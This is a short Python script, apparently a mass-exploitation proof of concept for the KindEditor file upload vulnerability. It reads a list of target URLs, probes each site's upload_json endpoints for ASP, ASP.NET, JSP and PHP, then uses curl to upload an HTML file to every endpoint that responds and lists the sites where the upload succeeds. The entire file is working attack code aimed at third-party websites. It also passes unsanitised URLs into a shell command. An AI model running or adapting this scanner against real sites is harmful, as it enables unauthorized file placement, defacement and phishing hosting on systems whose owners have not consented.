import requests
import os
import re


with open('kd-poc.txt', 'r') as file:
    lines = file.readlines()
    file.close()


upload_path = ['/asp/upload_json.asp', '/asp.net/upload_json.ashx',
               '/jsp/upload_json.jsp', '/php/upload_json.php']
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}


success_url = []


# 已经成功无需验证跳过
for i in lines:
    for j in upload_path:
        try:
            if len(i.split('/kindeditor.js')) == 1:
                url = i.split('/kindeditor-all-min.js')[0] + j
            else:
                url = i.split('/kindeditor.js')[0] + j
            res = requests.get(url, timeout=3, headers=headers)
            res.raise_for_status()
            if 'message' in res.text and '"error":1' in res.text:
                print('[Success] %s' % url)
                success_url.append(url)
        except:
            print('[Error] %s' % url)


print(success_url)


# with open('test.html','w+') as file:

#     file.writelines('<html>\n<html>')


exp_url = []

for i in success_url:
    cmd = 'curl -s -F "imgFile=@1.html" %s?dir=file' % i
    print(cmd)
    cmd_res = os.popen(cmd)
    cmd_text = cmd_res.read()
    print(cmd_text)
    re_res = re.findall(r'(\{"error":0,"url":".*"\})', cmd_text)
    if len(re_res) != 0:
        # print(re_res[0])
        exp_url.append(i)


[print(i) for i in exp_url]
print(len(exp_url))
# file=open('test.txt','r')


# for i in success_url:

#     res=requests.get(i[])
